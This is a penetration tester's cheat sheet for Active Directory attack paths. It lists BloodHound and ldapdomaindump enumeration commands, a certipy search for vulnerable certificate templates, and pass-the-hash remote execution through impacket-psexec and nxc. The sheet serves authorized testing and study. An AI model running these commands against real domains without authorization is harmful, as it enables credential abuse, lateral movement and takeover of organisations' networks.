Active Directory — attack paths
++++++++++++++++++++++++++++++++++++++++
# Map the domain (`bhce` wraps the CE-ready collection):
bhce <ip_address> <user> <password> <domain>
nxc ldap <ip_address> -u <user> -p <password> --bloodhound --collection All --dns-server <ip_address>
# bloodhound-ce-python IS the CE collector (apt `bloodhound-ce-python`). The bare name
# `bloodhound-python` is the LEGACY (≤4.3.1) binary from the 'bloodhound.py' pkg — its zips
# do NOT ingest into CE, and there is no symlink between the two:
bloodhound-ce-python -u <user> -p <password> -d <domain> -ns <ip_address> -c All
# rusthound-ce is the fast ALTERNATE collector on a large domain — one static Rust binary,
# no Python chain. UPSTREAM (`cargo install rusthound-ce`), not apt; complement, not replacement:
rusthound-ce -d <domain> -u <user>@<domain> -p <password> -i <ip_address> -z
# NOT --dc (that's kerbrute's idiom; impacket/certipy use -dc-ip): RustHound-CE takes -i/--ldapip for the DC IP, -f/--ldapfqdn for its FQDN.
# Whole-domain dump to browsable HTML + JSON + greppable TSV — the fast triage read
# while BloodHound ingests. apt name is python3-ldapdomaindump; the binary is bare
# ldapdomaindump (that dual name is why bootstrap's non-Kali pipx route uses the bare one):
ldapdomaindump -u '<domain>\<user>' -p <password> -o loot/ldd <ip_address>
# -p takes an LM:NTLM hash too. -r resolves computer hostnames: accurate, but loud on a big domain.

# Escalation primitives: AS-REP / Kerberoast (above) / unconstrained-deleg / GenericAll / DCSync.
certipy-ad find -u <user>@<domain> -p <password> -dc-ip <ip_address> -vulnerable  # AD CS (ESC1–ESC17)
impacket-psexec <domain>/<user>@<ip_address> -hashes :<NThash>   # PtH / overpass-the-hash
nxc smb <ip_address> -u <user> -H <NThash> -x 'whoami'

